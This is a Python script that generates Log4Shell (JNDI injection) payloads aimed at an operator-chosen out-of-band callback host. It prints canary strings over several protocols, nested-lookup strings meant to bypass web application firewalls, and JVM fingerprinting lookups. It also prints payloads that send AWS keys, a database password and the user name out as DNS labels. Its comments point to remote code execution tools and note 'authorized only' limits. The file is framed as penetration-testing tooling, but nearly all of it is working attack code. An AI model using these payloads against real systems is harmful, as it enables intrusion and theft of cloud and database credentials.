#!/usr/bin/env python3
"""
payload_gen.py - generate the JNDI/Log4Shell payload matrix for YOUR OOB host (authorized only).

Pure generator (no network): protocols + nested-lookup WAF-bypass + ${env} secret-exfil + JVM fingerprint lookups.
The finding is a target-sourced OOB callback carrying your token - not a reflected string. Point everything at your
OWN interactsh/Collaborator host; one benign proof, then STOP. (JNDI_TESTING_GUIDE.md Arsenal / §4-§11.)

Usage:
  python3 payload_gen.py --oob id.oast.fun
  python3 payload_gen.py --oob id.oast.fun --token ua --only exfil
"""
import sys
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass
import argparse


def host(oob, token):
    return f"{token}.{oob}" if token else oob


def canary(h):
    return [
        f"${{jndi:ldap://{h}/a}}",
        f"${{jndi:dns://{h}/a}}",
        f"${{jndi:rmi://{h}:1099/a}}",
        f"${{jndi:ldaps://{h}:1389/a}}",
        f"${{jndi:iiop://{h}/a}}",
    ]


def waf(h):
    return [
        f"${{${{lower:j}}ndi:ldap://{h}/a}}",
        f"${{${{lower:jndi}}:ldap://{h}/a}}",
        f"${{${{upper:j}}${{upper:n}}${{upper:d}}${{upper:i}}:ldap://{h}/a}}",
        f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{h}/a}}",
        f"${{${{env:NaN:-j}}ndi${{env:NaN:-:}}ldap://{h}/a}}",
        f"${{${{env:BARFOO:-j}}ndi:${{lower:l}}${{lower:d}}a${{lower:p}}://{h}/a}}",
        f"${{jndi:${{lower:l}}${{lower:d}}${{lower:a}}${{lower:p}}://{h}/a}}",
    ]


def exfil(oob, token):
    # secret becomes a DNS label to your OOB (works even on Log4j 2.15). token keeps callbacks self-labelling.
    tail = f"{token}.{oob}" if token else oob
    return [
        f"${{jndi:ldap://${{env:AWS_SECRET_ACCESS_KEY}}.{tail}/a}}",
        f"${{jndi:dns://${{env:AWS_ACCESS_KEY_ID}}.{tail}/a}}",
        f"${{jndi:ldap://${{env:DB_PASSWORD}}.{tail}/a}}",
        f"${{jndi:dns://${{sys:user.name}}.{tail}/a}}",
        f"${{jndi:ldap://${{env:KUBERNETES_SERVICE_HOST}}.{tail}/a}}",
    ]


def fingerprint(oob, token):
    tail = f"{token}.{oob}" if token else oob
    return [
        f"${{jndi:dns://ver-${{sys:java.version}}.{tail}/a}}",
        f"${{jndi:dns://os-${{sys:os.name}}.{tail}/a}}",
    ]


GROUPS = ["canary", "waf", "exfil", "fingerprint"]


def main():
    ap = argparse.ArgumentParser(description="Generate the JNDI/Log4Shell payload matrix (authorized only).")
    ap.add_argument("--oob", required=True, help="YOUR interactsh/Collaborator host, e.g. id.oast.fun")
    ap.add_argument("--token", default="", help="per-input label prefixed to the OOB host (self-labels callbacks)")
    ap.add_argument("--only", choices=GROUPS, help="print just one group")
    a = ap.parse_args()

    h = host(a.oob, a.token)
    out = {
        "canary": canary(h),
        "waf": waf(h),
        "exfil": exfil(a.oob, a.token),
        "fingerprint": fingerprint(a.oob, a.token),
    }
    groups = [a.only] if a.only else GROUPS
    titles = {
        "canary": "# canary (fire first; dns:// is stealthiest + egress-friendly)",
        "waf": "# WAF/filter bypass (nested lookups rebuild jndi/ldap at runtime)",
        "exfil": "# secret exfil over DNS (works on Log4j 2.15; the label = the stolen value)",
        "fingerprint": "# JVM/OS fingerprint (decides RCE technique - guide §9)",
    }
    print(f"# JNDI/Log4Shell payloads for OOB={a.oob}" + (f" token={a.token}" if a.token else ""))
    print("# authorized targets only. a target-sourced callback carrying your token = proof (guide §16). one benign proof, STOP.\n")
    for g in groups:
        print(titles[g])
        for p in out[g]:
            print(p)
        print()
    print("# next: spray these with jndi_probe.py (per-input tokens) and watch your OOB. RCE delivery = marshalsec /")
    print("#       JNDI-Injection-Exploit on AUTHORIZED engagements only (guide §10). one benign id, then STOP.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
